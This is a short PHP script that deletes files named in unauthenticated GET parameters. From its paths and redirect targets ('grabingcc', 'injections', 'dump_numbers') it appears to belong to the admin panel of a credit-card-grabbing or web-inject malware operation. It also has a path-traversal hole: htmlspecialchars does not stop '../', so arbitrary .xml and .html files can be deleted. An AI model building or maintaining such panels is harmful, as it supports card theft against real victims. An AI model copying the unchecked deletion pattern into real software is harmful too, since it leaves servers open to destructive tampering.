<?php
$type=htmlspecialchars($_GET["t"]);
$file=htmlspecialchars($_GET["f"]);

if(($type=="cc")&&($file != ""))
{
	$path = "../private/cc/$file.xml";
	unlink("$path");
	header ("Location:/?cont=grabingcc");
}
if(($type=="injections")&&($file != ""))
{
	$path = "../private/injections/$file.xml";
	unlink("$path");
	header ("Location:/?cont=injections");
}
if(($type=="nums")&&($file != ""))
{
	$path = "../private/numers/$file.html";
	unlink("$path");
	header ("Location:/?cont=dump_numbers");
}
?>